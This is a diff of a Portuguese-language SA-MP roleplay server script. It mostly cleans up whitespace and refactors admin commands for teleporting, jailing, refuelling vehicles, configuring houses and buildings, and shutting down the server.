         SendClientMessage(playerid, COLOR_CHAT, "[Cartas]: {FFFFFF}ligeiros, motociclos, pesados, barco");
-        
+
         return 1;
     }
 	if(!IsPlayerConnected(giveplayerid)) return SendClientMessage(playerid, COLOR_ERRO, MSG_NOTCONNECTED);
-	
+
 	if(strlen(carta) == 0) return SendClientMessage(playerid, COLOR_ERRO, "[ERRO:] {FFFFFF}Carta inválida.");
-	
+
 	if(strcmp(carta, "ligeiros", true) == 0)
 	{
 		format(string, sizeof(string), "Deste a Carta de Ligeiros ao jogador %s", GetPlayerNameEx(giveplayerid));
 		SendClientMessage(playerid, COLOR_INFO, string);
-	
+
 		format(string, sizeof(string), "O Administrador %s deu-te a Carta de Ligeiros", GetPlayerNameEx(playerid));
 		SendClientMessage(giveplayerid, COLOR_INFO, string);
-		
+
 		pInfo[giveplayerid][CartaLig] = 1;
 	}
 	else if(strcmp(carta, "motociclos", true) == 0)
@@ -22546,7 +22542,7 @@ COMMAND:checkafk(playerid, params[], help)
 
     if(sscanf(params, "d", giveplayerid)) return SendClientMessage(playerid, COLOR_CHAT, "[USO]: {FFFFFF}/checkafk <playerid>");
 	if(!IsPlayerConnected(giveplayerid)) return SendClientMessage(playerid, COLOR_ERRO, MSG_NOTCONNECTED);
-	
+
 	format(string, sizeof(string), "%s (ID:%d) está AFK há %d minutos.", GetPlayerNameEx(giveplayerid), giveplayerid, AFKWarning[giveplayerid]);
 	SendClientMessage(playerid, COLOR_INFO, string);
 
@@ -22573,7 +22569,7 @@ COMMAND:atestarcarro(playerid, params[], help)
     if(!IsPlayerInAnyVehicle(playerid)) return SendClientMessage(playerid, COLOR_ERRO, MSG_NOCAR);
 
 	new car = GetPlayerVehicleID(playerid);
-	
+
 	cInfo[car][Gasolina] = 100;
 
     SendClientMessage(playerid, COLOR_INFO, "Atestaste o carro");
@@ -22590,11 +22586,11 @@ COMMAND:atestarjob(playerid, params[], help)
     for(new c = 0; c < MAX_CARROS; c++)
     {
         if(cInfo[c][Type] == -1 && cInfo[c][Type] != -2) continue;
-        
+
 		cInfo[c][Gasolina] = 100;
     }
 
-    format(string, sizeof(string), "O Administrador %s atestou os carros de Job/Faction/Licenças do servidor!", GetPlayerNameEx(playerid));
+    format(string, sizeof(string), "O Administrador %s atestou os carros de Job/Licenças do servidor!", GetPlayerNameEx(playerid));
     SendClientMessageToAll(COLOR_INFO, string);
 
     return 1;
@@ -22619,7 +22615,7 @@ COMMAND:uid(playerid, params[], help)
 			break;
 		}
 	}
-	
+
 	if(counter == 0) return SendClientMessage(playerid, COLOR_ERRO, "[ERRO:] {FFFFFF}Não há ninguém com esse UID online.");
 
 	return 1;
@@ -22635,7 +22631,6 @@ COMMAND:a(playerid, params[], help)
 
 	foreach(new i : Player)
 	{
-		// if(!IsPlayerConnected(i)) continue;
 		if(pInfo[i][Admin] < 3) continue;
 
 		format(string, sizeof(string), "%s (ID:%d): %s", GetPlayerNameEx(playerid), playerid, chat);
@@ -22655,7 +22650,6 @@ COMMAND:gm(playerid, params[], help)
 
 	foreach(new i : Player)
 	{
-		// if(!IsPlayerConnected(i)) continue;
 		if(pInfo[i][Admin] == 0) continue;
 
 		format(string, sizeof(string), "%s (ID:%d): %s", GetPlayerNameEx(playerid), playerid, chat);
@@ -22686,7 +22680,7 @@ COMMAND:togglepm(playerid, params[], help)
 	if(PMStatus[playerid] == false)
 	{
 	    SendClientMessage(playerid, COLOR_INFO, "Ligaste as tuas PM's");
-	    
+
 	    PMStatus[playerid] = true;
 	}
 	else
@@ -22695,7 +22689,7 @@ COMMAND:togglepm(playerid, params[], help)
 
 	    PMStatus[playerid] = false;
 	}
-	
+
 	return 1;
 }
 
@@ -22762,11 +22756,11 @@ COMMAND:toggledebuguj(playerid, params[], help)
 COMMAND:desligarmotores(playerid, params[], help)
 {
     if(pInfo[playerid][Admin] < 4) return SendClientMessage(playerid, -1, MSG_NOADMIN);
-    
+
 	new string[128];
-    
+
 	DesligarMotores();
-	
+
 	format(string, sizeof(string), "O Administrador %s desligou os motores de todos os carros!", GetPlayerNameEx(playerid));
 	SendClientMessageToAll(COLOR_INFO, string);
 
@@ -22782,7 +22776,7 @@ COMMAND:check(playerid, params[], help)
     if(sscanf(params, "d", giveplayerid)) return SendClientMessage(playerid, COLOR_CHAT, "[USO]: {FFFFFF}/check <playerid>");
     if(!IsPlayerConnected(giveplayerid)) return SendClientMessage(playerid, COLOR_ERRO, MSG_NOTCONNECTED);
 
-	ShowStats(playerid, giveplayerid, 1);
+	ShowStatsAdmin(playerid, giveplayerid);
 
     return 1;
 }
@@ -22813,12 +22807,12 @@ COMMAND:tt(playerid, params[], help)
 
 	TogglePlayerSpectating(giveplayerid, false);
  	TogglePlayerControllable(giveplayerid, true);
- 	
+
  	UnlockTutorial[giveplayerid] = true;
  	KillTimer(TimerUnlockTutorial[giveplayerid]);
- 	
+
  	ShowPlayerDialog(giveplayerid, DIALOG_TT, DIALOG_STYLE_MSGBOX, "TUTORIAL", "{FFFFFF}Retiraram-te do tutorial.", "Ok", "");*/
- 	
+
  	SendClientMessage(playerid, COLOR_CHAT, "Comando desabilitado");
 
 	return 1;
@@ -22834,10 +22828,10 @@ COMMAND:mt(playerid, params[], help)
 
     if(sscanf(params, "ds[32]", giveplayerid, reason)) return SendClientMessage(playerid, COLOR_CHAT, "[USO]: {FFFFFF}/m(andar)t(utorial) <playerid> <razão>");
     if(!IsPlayerConnected(giveplayerid)) return SendClientMessage(playerid, COLOR_ERRO, MSG_NOTCONNECTED);
-    
+
     format(string, sizeof(string), "O jogador %s foi mandado para o tutorial por %s. Razão: %s.", GetPlayerNameEx(giveplayerid), GetPlayerNameEx(playerid), reason);
     SendClientMessageToAll(COLOR_INFO, string);
-    
+
 	format(string, sizeof(string), "{FFFFFF}Este servidor consiste em imitar a vida real ao máximo. Para isso precisas de fazer tudo o que normalmente uma pessoa"); strcat(sdialog,string);
 	format(string, sizeof(string), "\n{FFFFFF}normal faz. Tal como um cidadão normal e com pleno juízo, terés de trabalhar para te sustentares. Tens ao teu alcance várias maneiras de ganhar"); strcat(sdialog,string);
 	format(string, sizeof(string), "\n{FFFFFF}dinheiro, desde trabalhos até nas Factions (legais ou ilegais). Com este dinheiro que futuramente ganharás, poderás adquirir carros, casas,"); strcat(sdialog,string);
@@ -22847,11 +22841,11 @@ COMMAND:mt(playerid, params[], help)
 
 	KillTimer(TimerUnlockTutorial[giveplayerid]);
  	UnlockTutorial[giveplayerid] = false;
- 	TimerUnlockTutorial[giveplayerid] = SetTimerEx("UnlockTutorials", 10000, false, "i", giveplayerid);
- 	
+ 	TimerUnlockTutorial[giveplayerid] = SetPlayerTimer(playerid, "UnlockTutorials", 10000, false);
+
  	TogglePlayerSpectating(giveplayerid, true);
  	TogglePlayerControllable(giveplayerid, false);
- 	SetPlayerPosEx(giveplayerid, -831.1625,1629.0327,26.7540);
+ 	SetPlayerPosEx(giveplayerid, -831.1625, 1629.0327, 26.7540, -1, -1);
 
 	return ShowPlayerDialog(giveplayerid, DIALOG_TUTORIAL1, DIALOG_STYLE_MSGBOX, "TUTORIAL - Em que consiste o servidor", sdialog, "Próximo", "Sair");
 }
@@ -22879,7 +22873,7 @@ COMMAND:fixjobcars(playerid, params[], help)
     for(new c = 0; c < MAX_CARROS; c++)
     {
         if(c == 0) continue;
-        
+
         if(cInfo[c][Type] == -1 || cInfo[c][Type] == -2) continue;
 
 		RepairVehicle(c);
@@ -22901,7 +22895,7 @@ COMMAND:unlockjob(playerid, params[], help)
     for(new c = 0; c < MAX_CARROS; c++)
     {
         if(cInfo[c][Type] == -1 || cInfo[c][Faction] == 0) continue;
-        
+
 		cInfo[c][Trancado] = 0;
     }
 
@@ -22955,10 +22949,10 @@ COMMAND:setdoenca(playerid, params[], help)
 	{
 	    SendClientMessage(playerid, COLOR_CHAT, "[USO]: {FFFFFF}/setdoenca <playerid> <doença>");
 	    SendClientMessage(playerid, COLOR_CHAT, "[Doenças]: {FFFFFF}0: Saudével - 1: Gripe - 2: Infeção Urinária - 3: Dores de Barriga - 4: Ataques de Tosse");
-	    
+
 	    return 1;
 	}
-	
+
     if(!IsPlayerConnected(giveplayerid)) return SendClientMessage(playerid, COLOR_ERRO, MSG_NOTCONNECTED);
     if(doenca < 0 || doenca > 4) return SendClientMessage(playerid, COLOR_ERRO, "[ERRO:] {FFFFFF}Doença inválida");
 
@@ -22970,7 +22964,7 @@ COMMAND:setdoenca(playerid, params[], help)
 			SendClientMessage(playerid, COLOR_INFO, string);
 			format(string, sizeof(string), "O Administrador %s tirou-te as doenças", GetPlayerNameEx(giveplayerid));
 			SendClientMessage(giveplayerid, COLOR_INFO, string);
-			
+
 			pInfo[giveplayerid][ReceitaMedica] = 0;
 			pInfo[giveplayerid][Medicamentos] = 0;
 			pInfo[giveplayerid][MedicamentosTomados] = 0;
@@ -23004,9 +22998,9 @@ COMMAND:setdoenca(playerid, params[], help)
 			SendClientMessage(giveplayerid, COLOR_INFO, string);
 	    }
 	}
-	
+
 	pInfo[giveplayerid][Doenca] = doenca;
-	    
+
     return 1;
 }
 
@@ -23018,25 +23012,25 @@ COMMAND:curar(playerid, params[], help)
 
     if(sscanf(params, "d", giveplayerid)) return SendClientMessage(playerid, COLOR_CHAT, "[USO]: {FFFFFF}/curar <playerid>");
     if(!IsPlayerConnected(giveplayerid)) return SendClientMessage(playerid, COLOR_ERRO, MSG_NOTCONNECTED);
-    
+
     new Float:x, Float:y, Float:z;
-    
+
     TogglePlayerControllable(playerid, true);
-	
+
 	pInfo[giveplayerid][Morto] = 0;
 	pInfo[giveplayerid][MorteX] = 0;
 	pInfo[giveplayerid][MorteY] = 0;
 	pInfo[giveplayerid][MorteZ] = 0;
 	pInfo[giveplayerid][MorteVirtualWorld] = 0;
 	pInfo[giveplayerid][MorteInterior] = 0;
-	
+
 	GetPlayerPos(giveplayerid, x, y, z);
-	SetPlayerHealthEx(giveplayerid, 50, 0);
-	SetPlayerPosEx(giveplayerid, x, y, z);
+	SetPlayerHealthEx(giveplayerid, 50, HEALTH_SET);
+	SetPlayerPosEx(giveplayerid, x, y, z, -1, -1);
 
     format(string, sizeof(string), "Curaste o jogador %s", GetPlayerNameEx(giveplayerid));
     SendClientMessage(playerid, COLOR_INFO, string);
-    
+
     GameTextForPlayer(giveplayerid, "~r~Foste curado", 2000, 3);
 
     return 1;
@@ -23064,11 +23058,9 @@ COMMAND:darpaycheck(playerid, params[], help)
 
     foreach(new i : Player)
     {
-        // if(!IsPlayerConnected(i)) continue;
-
 		PayDay(i);
     }
-    
+
     format(string, sizeof(string), "O Administrador %s deu um PayCheck a toda a gente. Não se esqueçam de lhe agradecer!", GetPlayerNameEx(playerid));
     SendClientMessageToAll(COLOR_INFO, string);
 
@@ -23083,20 +23075,18 @@ COMMAND:aj(playerid, params[], help)
 
     if(sscanf(params, "dds[32]", giveplayerid, time, reason)) return SendClientMessage(playerid, COLOR_CHAT, "[USO]: {FFFFFF}/aj <playerid> <minutos> <razão>");
     if(!IsPlayerConnected(giveplayerid)) return SendClientMessage(playerid, COLOR_ERRO, MSG_NOTCONNECTED);
-    
+
 	if(time != 0)
 	{
     	format(string, sizeof(string), "%s foi de Admin Jail %d minutos por %s. Razão: %s.", GetPlayerNameEx(giveplayerid), time, GetPlayerNameEx(playerid), reason);
     	SendClientMessageToAll(COLOR_CHAT, string);
-    	
+
 		pInfo[giveplayerid][Jailed] = 1;
 		pInfo[giveplayerid][JailTime] = time*60;
 		ResetPlayerWeapons(giveplayerid);
-		
-		SetPlayerInterior(giveplayerid, 0);
-		SetPlayerVirtualWorld(giveplayerid,0);
-		SetPlayerPosEx(giveplayerid, AJx, AJy, AJz);
-		
+
+		SetPlayerPosEx(giveplayerid, AJx, AJy, AJz, 0, 0);
+
 		pInfo[giveplayerid][AJCounter]++;
 		sStats[0][AJs]++;
 	}
@@ -23104,10 +23094,10 @@ COMMAND:aj(playerid, params[], help)
 	{
     	format(string, sizeof(string), "%s foi retirado do Admin Jail por %s. Razão: %s.", GetPlayerNameEx(giveplayerid), GetPlayerNameEx(playerid), reason);
     	SendClientMessageToAll(COLOR_CHAT, string);
-    	
+
 		pInfo[giveplayerid][Jailed] = 0;
 		pInfo[giveplayerid][JailTime] = 0;
-		
+
 		SpawnarJogador(giveplayerid);
 		pInfo[giveplayerid][AJCounter]--;
 	}
@@ -23165,7 +23155,7 @@ COMMAND:adararma(playerid, params[], help)
     if(arma <= 0 || arma > 46) return SendClientMessage(playerid, COLOR_ERRO, "[ERRO:] {FFFFFF}Arma inválida");
     if(ammo <= 0 || ammo > 999) return SendClientMessage(playerid, COLOR_ERRO, "[ERRO:] {FFFFFF}Munição inválida");
     if(!IsPlayerConnected(giveplayerid)) return SendClientMessage(playerid, COLOR_ERRO, MSG_NOTCONNECTED);
-    
+
     GivePlayerWeapon(giveplayerid, arma, ammo);
 
     format(string, sizeof(string), "Tu deste ao jogador %s a arma %d com %d balas", GetPlayerNameEx(giveplayerid), arma, ammo);
@@ -23378,7 +23368,7 @@ COMMAND:aapreendidosentradapos(playerid, params[], help)
 	GetPlayerFacingAngle(playerid, a);
 	VW = GetPlayerVirtualWorld(playerid);
 	Int = GetPlayerInterior(playerid);
-	
+
 	oInfo[0][EntradaApreendidosX] = x;
 	oInfo[0][EntradaApreendidosY] = y;
 	oInfo[0][EntradaApreendidosZ] = z;
@@ -23449,20 +23439,20 @@ COMMAND:abankpos(playerid, params[], help)
 
     if(sscanf(params, "d", id)) return SendClientMessage(playerid, COLOR_CHAT, "[USO]: {FFFFFF}/abankpos <id (1-2)>");
     if(id <= 0 || id > 2) return SendClientMessage(playerid, COLOR_ERRO, "[ERRO:] {FFFFFF}ID inválido");
-    
+
 	new Float:x, Float:y, Float:z, VW, Int;
 
 	GetPlayerPos(playerid, x, y, z);
 	VW = GetPlayerVirtualWorld(playerid);
 	Int = GetPlayerInterior(playerid);
-    
+
 	switch(id)
 	{
 	    case 1:
 	    {
     		DestroyDynamicPickup(BancoPickup[0]);
   			DestroyDynamic3DTextLabel(BancoLabel[0]);
-  			
+
 			oInfo[0][Banco1X] = x;
 			oInfo[0][Banco1Y] = y;
 			oInfo[0][Banco1Z] = z;
@@ -23484,7 +23474,7 @@ COMMAND:abankpos(playerid, params[], help)
 			oInfo[0][Banco2Z] = z;
 			oInfo[0][Banco2VirtualWorld] = VW;
 			oInfo[0][Banco2Interior] = Int;
-			
+
         	BancoPickup[1] = CreateDynamicPickup(oInfo[0][Banco2PickupID], 1, oInfo[0][Banco2X], oInfo[0][Banco2Y], oInfo[0][Banco2Z], -1, -1, -1, 100.0);
         	BancoLabel[1] = CreateDynamic3DTextLabel("{99FF00}[ {FFFFFF}Banco {99FF00}]\n 'n'", COLOR_WHITE, oInfo[0][Banco2X], oInfo[0][Banco2Y], oInfo[0][Banco2Z], 10, INVALID_PLAYER_ID, INVALID_VEHICLE_ID, 0, -1, -1, -1, 100.0);
 
@@ -23513,7 +23503,7 @@ COMMAND:atuningpos(playerid, params[], help)
 	oInfo[0][TunningZ] = z;
 	oInfo[0][TunningVirtualWorld] = VW;
 	oInfo[0][TunningInterior] = Int;
-	
+
 	TunningPickup = CreateDynamicPickup(oInfo[0][TunningPickupID], 1, oInfo[0][TunningX], oInfo[0][TunningY], oInfo[0][TunningZ], -1, -1, -1, 100.0);
 	TunningLabel = CreateDynamic3DTextLabel("{99FF00}[ {FFFFFF}Zona de Tuning {99FF00}]\n 'n'", COLOR_WHITE, oInfo[0][TunningX], oInfo[0][TunningY], oInfo[0][TunningZ], 6, INVALID_PLAYER_ID, INVALID_VEHICLE_ID, 0, -1, -1, -1, 100.0);
 
@@ -23579,7 +23569,7 @@ COMMAND:aentregardrogaspos(playerid, params[], help)
 	oInfo[0][EntregarDrogasZ] = z;
 	oInfo[0][EntregarDrogasVirtualWorld] = VW;
 	oInfo[0][EntregarDrogasInterior] = Int;
-	
+
 	SendClientMessage(playerid, COLOR_CHAT, "Puxaste a posição de Entregar Drogas para ti");
 
     return 1;
@@ -23600,7 +23590,7 @@ COMMAND:acomprardrogapos(playerid, params[], help)
 	oInfo[0][ComprarDrogasZ] = z;
 	oInfo[0][ComprarDrogasVirtualWorld] = VW;
 	oInfo[0][ComprarDrogasInterior] = Int;
-	
+
 	SendClientMessage(playerid, COLOR_CHAT, "Puxaste a posição de Comprar Drogas para ti");
 
     return 1;
@@ -23651,7 +23641,7 @@ COMMAND:aprenderpos(playerid, params[], help)
 	oInfo[0][PrenderZ] = z;
 	oInfo[0][PrenderVirtualWorld] = VW;
 	oInfo[0][PrenderInterior] = Int;
-	
+
 	PrenderLabel = CreateDynamic3DTextLabel("{99FF00}[ {FFFFFF}Zona de Prender {99FF00}]", COLOR_WHITE, oInfo[0][PrenderX], oInfo[0][PrenderY], oInfo[0][PrenderZ], 6, INVALID_PLAYER_ID, INVALID_VEHICLE_ID, 0, -1, -1, -1, 100.0);
 
 	SendClientMessage(playerid, COLOR_CHAT, "Puxaste a posição de prender para ti");
@@ -23667,21 +23657,21 @@ COMMAND:aconducaopos(playerid, params[], help)
   	DestroyDynamic3DTextLabel(LicLabel);
 
 	new Float:x, Float:y, Float:z, VW, Int;
-	
+
 	GetPlayerPos(playerid, x, y, z);
 	VW = GetPlayerVirtualWorld(playerid);
 	Int = GetPlayerInterior(playerid);
-	
+
 	oInfo[0][LicX] = x;
 	oInfo[0][LicY] = y;
 	oInfo[0][LicZ] = z;
 	oInfo[0][LicVirtualWorld] = VW;
 	oInfo[0][LicInterior] = Int;
 	oInfo[0][LicPickupID] = 1239;
-	
+
 	LicPickup = CreateDynamicPickup(oInfo[0][LicPickupID], 1, oInfo[0][LicX], oInfo[0][LicY], oInfo[0][LicZ], -1, -1, -1, 100.0);
 	LicLabel = CreateDynamic3DTextLabel("{99FF00}[ {FFFFFF}/licencas {99FF00}]", COLOR_WHITE, oInfo[0][LicX], oInfo[0][LicY], oInfo[0][LicZ], 6, INVALID_PLAYER_ID, INVALID_VEHICLE_ID, 0, -1, -1, -1, 100.0);
-	
+
 	SendClientMessage(playerid, COLOR_CHAT, "Puxaste a posição das licenças para ti");
 
     return 1;
@@ -23711,9 +23701,9 @@ COMMAND:dardinheiro(playerid, params[], help)
 COMMAND:aduty(playerid, params[], help)
 {
     if(pInfo[playerid][Admin] == 0) return SendClientMessage(playerid, -1, MSG_NOADMIN);
-    
+
     new string[256];
-    
+
 	if(AdminDuty[playerid] == false)
 	{
 	   	switch(pInfo[playerid][Admin])
@@ -23752,13 +23742,13 @@ COMMAND:aduty(playerid, params[], help)
 			}
 		}
 		SetPlayerSkin(playerid, 217);
-  		SetPlayerHealthEx(playerid, 1000, 0);
+  		SetPlayerHealthEx(playerid, 1000, HEALTH_SET);
 		SetPlayerArmourEx(playerid, 1000, 0);
-		
+
 		Attach3DTextLabelToPlayer(DutyLabel[playerid], playerid, 0.0, 0.0, 0.7);
-		
+
 		AdminDuty[playerid] = true;
-		
+
 		Delete3DTextLabel(UIDLabel[playerid]);
 	}
 	else
@@ -23772,15 +23762,15 @@ COMMAND:aduty(playerid, params[], help)
 	        case 1337: { format(string, sizeof(string), "O Scripter {00FF00}%s {FFFFFF}(ID:{00FF00}%d{FFFFFF}) está agora fora de serviço", GetPlayerNameEx(playerid), playerid); }
 		}
 		SetPlayerSkin(playerid, pInfo[playerid][Skin]);
-		
-		SetPlayerHealthEx(playerid, 50, 0);
+
+		SetPlayerHealthEx(playerid, 50, HEALTH_SET);
 		SetPlayerArmourEx(playerid, 0, 0);
-		
+
 		SetPlayerColor(playerid, COLOR_WHITE);
 		Delete3DTextLabel(DutyLabel[playerid]);
-		
+
 		AdminDuty[playerid] = false;
-		
+
 		new suid[32];
 
 		format(suid, sizeof(suid), "{FF0000}[ {FF9900}%d {FF0000}]", pInfo[playerid][UID]);
@@ -23788,7 +23778,7 @@ COMMAND:aduty(playerid, params[], help)
 
 		Attach3DTextLabelToPlayer(UIDLabel[playerid], playerid, 0.0, 0.0, 0.5);
  	}
-	
+
 	SendClientMessageToAll(COLOR_WHITE, string);
 
     return 1;
@@ -23806,7 +23796,7 @@ COMMAND:restart(playerid, params[], help)
 			Kick(i);
 		}
 	}
-	
+
 	GuardarServidor();
 	SetTimerEx("SendRconCommand", 3000, false, "s", "exit");
 
@@ -23820,16 +23810,15 @@ COMMAND:close(playerid, params[], help)
 	foreach(new i : Player)
 	{
 		GuardarJogador(i);
-			
+
 		CleanChat(i);
-		SendClientMessage(playerid, COLOR_OOC, " >>>>> SERVIDOR A TERMINAR <<<<<");
-			
-		SetTimerEx("KickT", 15, false, "i", playerid);
+		SendClientMessage(playerid, COLOR_OOC, " >>>>> {E68D45}SERVIDOR A TERMINAR {B4C2C1}<<<<<");
+		SetPlayerTimer(i, "KickT", 15, false);
 	}
 
 	GuardarServidor();
-	
-	SetTimer("CrashServer", 6000, true);
+
+	SetTimer_("CrashServer", 1000, TIMER_NODELAY, 1);
 
     return 1;
 }
@@ -23865,9 +23854,7 @@ COMMAND:gotobiz(playerid, params[], help)
     if(sscanf(params, "d", id)) return SendClientMessage(playerid, COLOR_CHAT, "[USO]: {FFFFFF}/gotobiz <id> ");
     if(id <= 0 || id > (MAX_BUSINESS -1)) return SendClientMessage(playerid, COLOR_ERRO, "[ERRO:] {FFFFFF}ID inválido");
 
-	SetPlayerVirtualWorld(playerid, bInfo[id][EnterVirtualWorld]);
-	SetPlayerInterior(playerid, bInfo[id][EnterInterior]);
-	SetPlayerPosEx(playerid, bInfo[id][EnterX], bInfo[id][EnterY], bInfo[id][EnterZ]);
+	SetPlayerPosEx(playerid, bInfo[id][EnterX], bInfo[id][EnterY], bInfo[id][EnterZ], bInfo[id][EnterVirtualWorld], bInfo[id][EnterInterior]);
 
 	format(string, sizeof(string), "Foste até é loja %d", id);
 	SendClientMessage(playerid, COLOR_INFO, string);
@@ -23884,10 +23871,8 @@ COMMAND:gotohouse(playerid, params[], help)
     if(sscanf(params, "d", id)) return SendClientMessage(playerid, COLOR_CHAT, "[USO]: {FFFFFF}/gotohouse <id> ");
     if(id <= 0 || id > (MAX_CASAS -1)) return SendClientMessage(playerid, COLOR_ERRO, "[ERRO:] {FFFFFF}ID inválido");
 
-	SetPlayerVirtualWorld(playerid, hInfo[id][EnterVirtualWorld]);
-	SetPlayerInterior(playerid, hInfo[id][EnterInterior]);
-	SetPlayerPosEx(playerid, hInfo[id][EnterX], hInfo[id][EnterY], hInfo[id][EnterZ]);
-	
+	SetPlayerPosEx(playerid, hInfo[id][EnterX], hInfo[id][EnterY], hInfo[id][EnterZ], hInfo[id][EnterVirtualWorld], hInfo[id][EnterInterior]);
+
 	format(string, sizeof(string), "Foste até é casa %d", id);
 	SendClientMessage(playerid, COLOR_INFO, string);
 
@@ -23912,16 +23897,14 @@ COMMAND:goto(playerid, params[], help)
 	if(GetPlayerState(playerid) == 2)
 	{
 		new car = GetPlayerVehicleID(playerid);
-		
+
 		SetPlayerVirtualWorld(playerid, VW);
 		SetPlayerInterior(playerid, Int);
 		SetVehiclePosEx(car, x, y, z);
 	}
 	else
 	{
-		SetPlayerVirtualWorld(playerid, VW);
-		SetPlayerInterior(playerid, Int);
-		SetPlayerPosEx(playerid, x, y, z);
+		SetPlayerPosEx(playerid, x, y, z, VW, Int);
 	}
 
     return 1;
@@ -23941,10 +23924,10 @@ COMMAND:gethere(playerid, params[], help)
 	GetPlayerPos(playerid, x, y, z);
 	VW = GetPlayerVirtualWorld(playerid);
 	Int = GetPlayerInterior(playerid);
-	
-	
+
+
 	EnableAntiCheatForPlayer(giveplayerid, 2, 0);
-	
+
 	if(GetPlayerState(giveplayerid) == 2)
 	{
 		new car = GetPlayerVehicleID(giveplayerid);
@@ -23955,11 +23938,9 @@ COMMAND:gethere(playerid, params[], help)
 	}
 	else
 	{
-		SetPlayerVirtualWorld(giveplayerid, VW);
-		SetPlayerInterior(giveplayerid, Int);
-		SetPlayerPosEx(giveplayerid, x, y, z);
+		SetPlayerPosEx(giveplayerid, x, y, z, VW, Int);
 	}
-	
+
 	EnableAntiCheatForPlayer(giveplayerid, 2, 1);
 
     return 1;
@@ -23971,7 +23952,7 @@ COMMAND:kick(playerid, params[], help)
 
     new giveplayerid, reason[32];
 
-    if(sscanf(params, "us[16]", giveplayerid, reason)) return SendClientMessage(playerid, COLOR_CHAT, "[USO]: {FFFFFF}/kick <playerid> <razão>");
+    if(sscanf(params, "us[32]", giveplayerid, reason)) return SendClientMessage(playerid, COLOR_CHAT, "[USO]: {FFFFFF}/kick <playerid> <razão>");
     if(!IsPlayerConnected(giveplayerid)) return SendClientMessage(playerid, COLOR_ERRO, MSG_NOTCONNECTED);
 
     KickPlayer(giveplayerid, GetPlayerNameEx(playerid), reason);
@@ -23990,7 +23971,7 @@ COMMAND:freeze(playerid, params[], help)
     if(!IsPlayerConnected(giveplayerid)) return SendClientMessage(playerid, COLOR_ERRO, MSG_NOTCONNECTED);
 
 	TogglePlayerControllable(giveplayerid, false);
-	
+
 	format(string, sizeof(string), "O Administrador %s congelou-te", GetPlayerNameEx(playerid));
 	SendClientMessage(giveplayerid, COLOR_CHAT, string);
 	format(string, sizeof(string), "Congelaste o jogador %s", GetPlayerNameEx(giveplayerid));
@@ -24051,11 +24032,11 @@ COMMAND:banip(playerid, params[], help)
 COMMAND:o(playerid, params[], help)
 {
 	new chat[128];
-	
+
     if(sscanf(params, "s[128]", chat)) return SendClientMessage(playerid, COLOR_CHAT, "[USO]: {FFFFFF}/o <mensagem>");
-    
+
 	new string[256];
-	
+
 	switch(pInfo[playerid][Admin])
 	{
 	    case 0:
@@ -24068,7 +24049,7 @@ COMMAND:o(playerid, params[], help)
 			else
 			{
 			    if(OOCStatus == false) return SendClientMessage(playerid, COLOR_ERRO, "[ERRO:] {FFFFFF}Chat OOC desabilitado.");
-			    
+
        			format(string, sizeof(string), "(( [OOC:] %s: %s ))", GetPlayerNameEx(playerid), chat);
 	        	SendClientMessageToAll(0xEBC7EDAA, string);
 			}
@@ -24099,7 +24080,7 @@ COMMAND:o(playerid, params[], help)
 	        SendClientMessageToAll(COLOR_OWNER, string);
 	    }
 	}
-	
+
     return 1;
 }
 
@@ -24108,9 +24089,9 @@ COMMAND:oocstatus(playerid, params[], help)
     if(pInfo[playerid][Admin] < 5) return SendClientMessage(playerid, -1, MSG_NOADMIN);
 
 	new string[128];
-	
+
 	OOCStatus = true;
-	
+
 	format(string, sizeof(string), "O chat OOC foi habilitado pelo administrador %s", GetPlayerNameEx(playerid));
 	SendClientMessageToAll(-1, string);
 
@@ -24142,7 +24123,7 @@ COMMAND:abuildingint(playerid, params[], help)
 		SendClientMessage(playerid, COLOR_CHAT, string);
 		format(string, sizeof(string), "[INTS:] {FFFFFF}Escola de Condução: %d - Centro de Emprego: %d - Aeroporto: %d - Hospital 2: %d - Hospital 3: %d - Fábrica: %d", BUILDING_CONDUCAO, BUILDING_CE, BUILDING_AEROPORTO, BUILDING_HOSPITAL2, BUILDING_HOSPITAL3, BUILDING_FABRICA);
 		SendClientMessage(playerid, COLOR_CHAT, string);
-		
+
 		return 1;
 	}
 
@@ -24157,9 +24138,9 @@ COMMAND:abuildingint(playerid, params[], help)
 			buInfo[id][ExitY] = -1675.4264;
 			buInfo[id][ExitZ] = 1101.0859;
 			buInfo[id][ExitAngle] = 271.4001;
-			
+
 			buInfo[id][Interior] = 1;
-			
+
 			format(string, sizeof string, "Building: %d - Descrição: Polícia.", id);
 			SendClientMessage(playerid, COLOR_INFO, string);
         }
@@ -24277,7 +24258,7 @@ COMMAND:abuildingint(playerid, params[], help)
 			buInfo[id][ExitY] = 2108.292480;
 			buInfo[id][ExitZ] = 1011.030273;
 			buInfo[id][ExitAngle] = 276.030273;
-			
+
 			buInfo[id][Interior] = 1;
 
 			format(string, sizeof string, "Building: %d - Descrição: Fábrica.", id);
@@ -24285,7 +24266,7 @@ COMMAND:abuildingint(playerid, params[], help)
         }
 	}
 	GuardarBuilding(id);
-	
+
 	return 1;
 }
 
@@ -24327,7 +24308,7 @@ COMMAND:abuildingname(playerid, params[], help)
     if(id <= 0 || id > (MAX_BUILDINGS -1)) return SendClientMessage(playerid, COLOR_ERRO, "[ERRO:] {FFFFFF}ID inválido");
 
 	new string[128];
-	
+
 	format(buInfo[id][Nome], 32, "%s", nome);
 
 	GuardarBuilding(id);
@@ -24361,7 +24342,7 @@ COMMAND:abuildingentrance(playerid, params[], help)
  	buInfo[id][EnterAngle] = a;
  	buInfo[id][EnterInterior] = Int;
  	buInfo[id][EnterVirtualWorld] = VW;
- 	
+
 	GuardarBuilding(id);
 
     format(string, sizeof(string), "Setaste a entrada do building %d para a tua posição", id);
@@ -24462,9 +24443,9 @@ COMMAND:ahouseconfig(playerid, params[], help)
         hInfo[id][Price] = 650000;
 		format(hInfo[id][Nome], 32, "%s", "Mansão");
 	}
-	
+
 	new interior = random(46);
-	
+
     switch(interior)
     {
         case 1:
@@ -24905,7 +24886,7 @@ COMMAND:agarageentrance(playerid, params[], help)
  	hInfo[id][GaragemEnterZ] = z;
  	hInfo[id][GaragemEnterInterior] = Int;
  	hInfo[id][GaragemEnterVirtualWorld] = VW;
- 	
+
 	GuardarCasa(id);
 	AtualizarCasa(id);
 
@@ -25351,7 +25332,7 @@ COMMAND:ahousedesc(playerid, params[], help)
     if(id <= 0 || id > (MAX_CASAS -1)) return SendClientMessage(playerid, COLOR_ERRO, "[ERRO:] {FFFFFF}ID inválido");
 
 	new string[128];
-	
+
 	format(hInfo[id][Nome], 32, "%s", nome);
 	GuardarCasa(id);
 	AtualizarCasa(id);
@@ -25529,7 +25510,7 @@ COMMAND:resethouses(playerid, params[], help)
 		hInfo[i][GaragemVirtualWorld] = 0;
